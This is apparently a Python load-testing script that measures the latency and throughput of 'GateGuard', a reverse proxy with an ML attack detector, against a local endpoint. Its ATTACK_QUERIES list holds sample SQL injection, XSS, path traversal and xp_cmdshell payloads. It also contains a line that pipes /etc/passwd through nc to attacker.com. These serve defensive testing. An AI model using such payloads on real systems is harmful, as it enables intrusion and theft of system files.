#!/usr/bin/env python3
"""
GateGuard Latency & Throughput Benchmark
-----------------------------------------
Measures real end-to-end proxy performance including:
- Go Reverse Proxy routing & LRU caching
- Session token SHA256 extraction & Redis blocklist check
- ONNX ML model feature extraction & inference (4 features)
- Redis strike increment & session status tracking
- Upstream backend request forwarding (http://127.0.0.1:8000)

Ensures unique Authorization Bearer tokens per request to prevent
premature two-strike kills from skewing forwarded latency distributions.
"""

import argparse
import http.client
import json
import random
import statistics
import time
import urllib.parse
import uuid
from concurrent.futures import ThreadPoolExecutor, as_completed

BENIGN_QUERIES = [
    "incident report",
    "proxy config",
    "system audit",
    "user credentials",
    "database migration",
    "auth policy",
    "admin guidelines",
    "network logs",
    "security compliance",
    "dashboard metrics",
    "performance benchmark",
    "session timeout",
    "health check",
    "load balancer latency",
    "firewall rules"
]

ATTACK_QUERIES = [
    "1' UN/**/ION SEL/**/ECT 1,2,3--",
    "1' OR '1'='1' --",
    "SELECT * FROM users WHERE 1=1",
    "<script>alert(1)</script>",
    "<iframe src=javascript:alert(document.cookie)>",
    "../../../../etc/passwd",
    "cat /etc/passwd | nc attacker.com 80",
    "xp_cmdshell 'whoami'"
]


def send_http_request(host, port, path, headers=None, method="GET", body=None, timeout=10):
    """Sends a single HTTP request using http.client for low client-side overhead."""
    conn = http.client.HTTPConnection(host, port, timeout=timeout)
    start_time = time.perf_counter()
    status = 0
    try:
        conn.request(method, path, body=body, headers=headers or {})
        response = conn.getresponse()
        status = response.status
        _ = response.read()
    except Exception as e:
        status = 0
    finally:
        conn.close()

    elapsed_ms = (time.perf_counter() - start_time) * 1000.0
    return elapsed_ms, status


def run_worker(host, port, num_requests, attack_ratio=0.10):
    """Worker loop issuing requests with unique tokens per request."""
    latencies = []
    statuses = []
    benign_latencies = []
    attack_latencies = []

    for _ in range(num_requests):
        token = f"bench_tok_{uuid.uuid4().hex[:12]}"
        headers = {
            "Authorization": f"Bearer {token}",
            "User-Agent": "GateGuard-Bench/1.0"
        }

        is_attack = random.random() < attack_ratio
        if is_attack:
            query = random.choice(ATTACK_QUERIES)
        else:
            query = random.choice(BENIGN_QUERIES)

        encoded_q = urllib.parse.quote(query)
        path = f"/search?q={encoded_q}"

        lat_ms, status = send_http_request(host, port, path, headers=headers)
        latencies.append(lat_ms)
        statuses.append(status)

        if is_attack:
            attack_latencies.append(lat_ms)
        else:
            benign_latencies.append(lat_ms)

    return latencies, statuses, benign_latencies, attack_latencies


def percentile(data, p):
    """Calculates percentile p (0-100) from sorted list."""
    if not data:
        return 0.0
    sorted_d = sorted(data)
    idx = (len(sorted_d) - 1) * (p / 100.0)
    floor_idx = int(idx)
    ceil_idx = floor_idx + 1
    if ceil_idx >= len(sorted_d):
        return sorted_d[-1]
    weight = idx - floor_idx
    return sorted_d[floor_idx] * (1.0 - weight) + sorted_d[ceil_idx] * weight


def main():
    parser = argparse.ArgumentParser(description="GateGuard End-to-End Latency Benchmark")
    parser.add_argument("--host", default="127.0.0.1", help="Target Proxy Host (default: 127.0.0.1)")
    parser.add_argument("--port", type=int, default=9000, help="Target Proxy Port (default: 9000)")
    parser.add_argument("--users", type=int, default=30, help="Concurrent simulated users (threads, default: 30)")
    parser.add_argument("--requests", type=int, default=600, help="Total requests to execute (default: 600)")
    parser.add_argument("--attack-ratio", type=float, default=0.10, help="Ratio of attack queries (default: 0.10 / 10%%)")
    args = parser.parse_args()

    host = args.host
    port = args.port
    users = args.users
    total_requests = args.requests
    reqs_per_user = max(1, total_requests // users)
    actual_total = reqs_per_user * users

    print("=" * 72)
    print(" GATEGUARD REVERSE PROXY END-TO-END LATENCY BENCHMARK")
    print("=" * 72)
    print(f"Target Proxy URL : http://{host}:{port}")
    print(f"Concurrent Users : {users}")
    print(f"Total Requests   : {actual_total} ({reqs_per_user} per user)")
    print(f"Traffic Mix      : {int((1 - args.attack_ratio) * 100)}% Benign / {int(args.attack_ratio * 100)}% Attack Payloads")
    print(f"Token Isolation  : Unique Bearer Token per request (prevents false 403 blocks)")
    print("=" * 72)
    print("Executing benchmark across worker pool, please wait...\n")

    start_wall = time.perf_counter()

    all_latencies = []
    all_statuses = []
    all_benign_lats = []
    all_attack_lats = []

    with ThreadPoolExecutor(max_workers=users) as executor:
        futures = [
            executor.submit(run_worker, host, port, reqs_per_user, args.attack_ratio)
            for _ in range(users)
        ]

        for future in as_completed(futures):
            lats, stats, b_lats, a_lats = future.result()
            all_latencies.extend(lats)
            all_statuses.extend(stats)
            all_benign_lats.extend(b_lats)
            all_attack_lats.extend(a_lats)

    total_wall_time = time.perf_counter() - start_wall
    rps = len(all_latencies) / total_wall_time if total_wall_time > 0 else 0

    count_200 = all_statuses.count(200)
    count_403 = all_statuses.count(403)
    count_other = len(all_statuses) - count_200 - count_403

    p50 = percentile(all_latencies, 50)
    p95 = percentile(all_latencies, 95)
    p99 = percentile(all_latencies, 99)
    avg_lat = statistics.mean(all_latencies) if all_latencies else 0.0
    min_lat = min(all_latencies) if all_latencies else 0.0
    max_lat = max(all_latencies) if all_latencies else 0.0

    print("=" * 72)
    print(" BENCHMARK RESULTS SUMMARY")
    print("=" * 72)
    print(f"Total Requests Completed : {len(all_latencies)}")
    print(f"Forwarded (200 OK)       : {count_200} ({count_200 / len(all_latencies) * 100:.1f}%)")
    print(f"Rejected  (403 Blocked)  : {count_403} ({count_403 / len(all_latencies) * 100:.1f}%)")
    if count_other > 0:
        print(f"Other Statuses           : {count_other}")
    print(f"Total Wall Clock Time    : {total_wall_time:.2f} s")
    print(f"Throughput               : {rps:.2f} req/sec")
    print("-" * 72)
    print(" LATENCY PERCENTILES (End-to-End through Proxy + ONNX + Redis):")
    print(f"  * Min Latency          : {min_lat:.2f} ms")
    print(f"  * Avg Latency (Mean)   : {avg_lat:.2f} ms")
    print(f"  * P50 (Median)         : {p50:.2f} ms   <-- Pitch Deck Median Baseline")
    print(f"  * P95 (SLA Target)     : {p95:.2f} ms   <-- Pitch Deck 95th Percentile")
    print(f"  * P99 (Tail Latency)   : {p99:.2f} ms   <-- Pitch Deck 99th Percentile Tail")
    print(f"  * Max Latency          : {max_lat:.2f} ms")

    if all_benign_lats:
        print("-" * 72)
        print(" LATENCY BREAKDOWN BY TRAFFIC TYPE:")
        print(f"  * Benign Traffic (N={len(all_benign_lats)}):")
        print(f"      Avg: {statistics.mean(all_benign_lats):.2f} ms | P50: {percentile(all_benign_lats, 50):.2f} ms | P95: {percentile(all_benign_lats, 95):.2f} ms | P99: {percentile(all_benign_lats, 99):.2f} ms")
    if all_attack_lats:
        print(f"  * Attack Traffic (N={len(all_attack_lats)}, ONNX Scored):")
        print(f"      Avg: {statistics.mean(all_attack_lats):.2f} ms | P50: {percentile(all_attack_lats, 50):.2f} ms | P95: {percentile(all_attack_lats, 95):.2f} ms | P99: {percentile(all_attack_lats, 99):.2f} ms")
    print("=" * 72)


if __name__ == "__main__":
    main()
